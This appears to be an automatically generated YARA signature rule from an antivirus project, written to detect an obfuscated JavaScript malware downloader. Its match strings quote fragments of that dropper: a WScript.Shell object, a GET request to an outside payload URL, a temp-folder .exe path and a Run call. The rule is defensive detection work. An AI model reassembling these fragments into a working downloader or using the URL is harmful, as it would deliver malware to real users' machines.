rule sig_20160330_7a8aa361cc041f6501cd754f60c7b989 {
  meta:
    description = "datamaliciousorder - file 20160330_7a8aa361cc041f6501cd754f60c7b989.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "41daa1b3b858bbe04e884f5fca2452784b2353a787b6416be6ca5fbde2958fc5"

  strings:
    $s1  = "var _M0 = function _UT() {return WScript[_UL](\"WScript\"+\".Shell\");}(), _NV = 11;" fullword ascii
    $s2  = "_J1[_TI](\"GET\", \"http://bqsc.pt/c6ska\", false);" fullword ascii
    $s3  = "function _U(_BN, _OA){_J = _J * 1; return _BN - _OA;};" fullword ascii
    $s4  = "if (_J1[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _YF(){return _LU + \"\";};" fullword ascii
    $s6  = "function _HP() {return _M0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"HNNQYiRouqoC6Q6.ex\" + \"e\";};" fullword ascii
    $s7  = "function _M() {return ((_XX == true) && (_XX == _F)) ? 1 : _J;};" fullword ascii
    $s8  = "function _WL(_KU){_M0[\"Run\"](_KU, _J, _J);};" fullword ascii
    $s9  = "function _X(){return 22;};" fullword ascii
    $s10 = " while (_HB){" fullword ascii
    $s11 = "function _NF(_R) {var _I0 = (1, 2, 3, 4, 5, _R); return _I0;};" fullword ascii
    $s12 = "function _I(){return _UL;};" fullword ascii
    $s13 = "function _UT0()" fullword ascii
    $s14 = "return _U(_JF, _TD);" fullword ascii
    $s15 = "var _JG = new this[\"Date\"]();" fullword ascii
    $s16 = "var _D = false;" fullword ascii
    $s17 = "_F = true; " fullword ascii
    $s18 = "_XX = true; " fullword ascii
    $s19 = "var _XX = false;" fullword ascii
    $s20 = "} catch(_R0){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}